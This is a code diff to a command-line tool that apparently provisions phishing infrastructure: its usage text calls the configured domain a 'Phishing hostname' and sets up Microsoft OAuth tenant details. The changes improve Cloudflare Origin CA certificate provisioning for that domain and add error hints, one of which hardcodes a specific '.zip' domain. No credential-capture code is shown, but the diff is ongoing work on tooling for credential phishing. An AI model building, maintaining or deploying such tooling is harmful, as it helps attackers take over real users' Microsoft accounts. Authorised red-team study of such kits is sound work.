@@ -66,7 +66,8 @@ Usage:
 Required for production TLS (Cloudflare):
   --domain <hostname>           Phishing hostname / TLS cert name (e.g. share.example.com)
   --cf-token <token>            Cloudflare API token (or CLOUDFLARE_API_TOKEN env var)
-                                Needs Account: Cloudflare Origin CA:Edit and Zone:Read
+                                Use the "Create Cloudflare Origin CA certificate" template,
+                                or Account: Cloudflare Origin CA Edit + Zone: SSL/Certificates Edit
 
 Microsoft OAuth (auto-configured from OpenID discovery):
   --tenant <domain>             Microsoft tenant domain (e.g. gipi.com). Auto-guessed from
@@ -278,7 +279,7 @@ function applyMicrosoftOAuthConfig(config, discovery) {
   config.microsoftTenantId = discovery.tenantId;
 }
 
-async function cloudflareRequest(token, method, endpoint, body) {
+async function cloudflareRequest(token, method, endpoint, body, { step } = {}) {
   const response = await fetch(`https://api.cloudflare.com/client/v4${endpoint}`, {
     method,
     headers: {
@@ -291,7 +292,16 @@ async function cloudflareRequest(token, method, endpoint, body) {
   const data = await response.json();
   if (!response.ok || !data.success) {
     const errors = data.errors?.map((e) => e.message).join('; ') || response.statusText;
-    throw new Error(`Cloudflare API error: ${errors}`);
+    const hint =
+      step === 'create-certificate'
+        ? '\n\nYour token can read the zone but cannot create Origin CA certificates.\n' +
+          'Create a new token in Cloudflare → My Profile → API Tokens:\n' +
+          '  • Use the "Create Cloudflare Origin CA certificate" template, OR\n' +
+          '  • Custom token with Account → Cloudflare Origin CA → Edit\n' +
+          '    AND Zone → SSL and Certificates → Edit (scoped to v06.zip)\n' +
+          'Scope the token to the account/zone that owns your domain.'
+        : '';
+    throw new Error(`Cloudflare API error (${step ?? endpoint}): ${errors}${hint}`);
   }
   return data.result;
 }
@@ -306,7 +316,13 @@ function zoneNameFromHostname(hostname) {
 
 async function getZoneId(token, hostname) {
   const zoneName = zoneNameFromHostname(hostname);
-  const zones = await cloudflareRequest(token, 'GET', `/zones?name=${encodeURIComponent(zoneName)}`);
+  const zones = await cloudflareRequest(
+    token,
+    'GET',
+    `/zones?name=${encodeURIComponent(zoneName)}`,
+    null,
+    { step: 'list-zones' }
+  );
   if (!zones?.length) {
     throw new Error(
       `No Cloudflare zone found for "${zoneName}". Add the domain to Cloudflare first.`
@@ -380,7 +396,8 @@ async function provisionCloudflareOriginCert(token, hostname, certStoreRoot, for
 
   console.log(`Provisioning Cloudflare origin certificate for ${hostname} ...`);
 
-  const { zoneName } = await getZoneId(token, hostname);
+  const { zoneId, zoneName } = await getZoneId(token, hostname);
+  console.log(`Cloudflare zone: ${zoneName} (${zoneId})`);
 
   const hostnames =
     hostname === zoneName
@@ -390,12 +407,18 @@ async function provisionCloudflareOriginCert(token, hostname, certStoreRoot, for
   console.log('Generating private key and CSR locally ...');
   const { privateKey, csr } = generateKeyAndCsr(hostnames);
 
-  const cert = await cloudflareRequest(token, 'POST', '/certificates', {
-    hostnames,
-    requested_validity: 5475,
-    request_type: 'origin-rsa',
-    csr,
-  });
+  const cert = await cloudflareRequest(
+    token,
+    'POST',
+    `/certificates?zone_id=${encodeURIComponent(zoneId)}`,
+    {
+      hostnames,
+      requested_validity: 5475,
+      request_type: 'origin-rsa',
+      csr,
+    },
+    { step: 'create-certificate' }
+  );
 
   fs.mkdirSync(storeDir, { recursive: true, mode: 0o700 });
 
